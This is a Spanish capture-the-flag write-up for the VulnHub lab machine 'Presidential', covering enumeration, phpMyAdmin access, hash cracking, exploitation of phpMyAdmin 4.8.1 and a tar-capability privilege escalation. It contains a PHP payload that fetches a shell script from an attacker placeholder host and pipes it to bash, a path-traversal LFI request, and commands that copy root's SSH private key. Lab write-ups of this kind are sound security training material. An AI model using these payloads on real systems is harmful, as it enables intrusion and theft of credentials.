---
tags:
  - type/writeup
  - estado/completo
plataforma: "[[VulnHub]]"
web: https://www.vulnhub.com/presidential
dificultad: Fácil
os: Linux
relacionados:
  - "[[SSH (22) - Enumeración|ssh]]"
  - "[[john]]"
  - "[[phpmyadmin]]"
  - "[[getcap]]"
  - "[[tar]]"
---
#  Presidential

## Reconocimiento y Enumeración

### Identificación de IP y Puertos  

```bash
netdiscover -i eth0
nmap -A -p- <IP_TARGET>
```  
Detectamos servicios clave:  
- **Puerto 80 (HTTP)**: Sitio web principal  
- **Puerto 2082 (SSH)**: Servicio SSH no estándar  

### Enumeración Web  

- Inspeccionar código fuente del sitio principal (`votenow.local`):  
  - Dominio identificado en correo electrónico (`contact@votenow.local`)  
- Configurar virtual hosts en `/etc/hosts`:  
```bash
echo "<IP_TARGET> votenow.local" >> /etc/hosts
```

### Búsqueda de Subdominios  

**Opción 1 (ffuf):**  
```bash
ffuf -c -u http://votenow.local -H "Host: FUZZ.votenow.local" -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -fw 2256
```

**Opción 2 (wfuzz):**  
```bash
wfuzz -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -H "Host: FUZZ.votenow.local" --hw 854 --hc 400 -t 100 http://<IP_TARGET>
```  

**Subdominio descubierto:** `datasafe.votenow.local`
```bash
echo "<IP_TARGET> datasafe.votenow.local" >> /etc/hosts
```

### Archivos Ocultos  

```bash
gobuster dir -u http://votenow.local -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x php,bak
```  
**Archivo crítico:** `config.php.bak` con credenciales DB:  
```php
$dbuser = 'votebox';
$dbpass = 'casoj3FFASPsbyoRP';
```

## Explotación Inicial

### Acceso a phpMyAdmin  

- URL: `http://datasafe.votenow.local/phpmyadmin`  
- Credenciales: `votebox:casoj3FFASPsbyoRP`  
- En base de datos `voting_db`:  
  - Hash MD5 de usuario `admin`: `8b0d1fbb4ab73a6d3d02a568c6ef51d7`

### Crackeo de Hash  

```bash
echo "8b0d1fbb4ab73a6d3d02a568c6ef51d7" > hash.txt
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```  
**Contraseña obtenida:** `Stella`

### Explotación de Vulnerabilidad en phpMyAdmin (v4.8.1)  

**Payload para RCE:**  
```sql
SELECT '<?php system("curl http://<IP_ATACANTE>/shell.sh | bash"); ?>'
```

**Ejecución mediante LFI:**  
```bash
curl -I "http://datasafe.votenow.local/index.php?target=db_sql.php%3f/../../../../../../../../var/lib/php/session/sess_$(curl -s -c cookies.txt http://datasafe.votenow.local | grep -oP 'PHPSESSID=\K[^;]+')"
```

**Listener:**  
```bash
nc -nlvp 443
```

## Movimiento Lateral

### Acceso SSH  

```bash
ssh admin@<IP_TARGET> -p 2082
```  
**Credenciales:** `admin:Stella`

## Escalada de Privilegios

### Abuso de Capabilidades Linux  

```bash
getcap -r / 2>/dev/null
```  
**Hallazgo crítico:**  
```bash
/usr/bin/tar = cap_dac_read_search+ep
```

La capabilitie llamativa en el binario tar: `cap_dac_read_search+ep` puede dar permisos completos con los archivos que se descomprimen. 

### Extracción de Clave SSH de Root  

```bash
tar -cvf root_key.tar /root/.ssh/id_rsa
tar -xvf root_key.tar --strip-components=1
chmod 600 id_rsa
ssh -i id_rsa root@<IP_TARGET>
```

## Bandera(s)

> [!flag] `flag{user}`
> 663ba6a402a57536772c6118e8181570
^bandera-user

> [!flag] `flag{root}`
> 
```
 _._     _,-'""`-._
(,-.`._,'(       |\`-/|
    `-.-' \ )-`( , o o)
          `-    \`_`"'-
```
^bandera-root
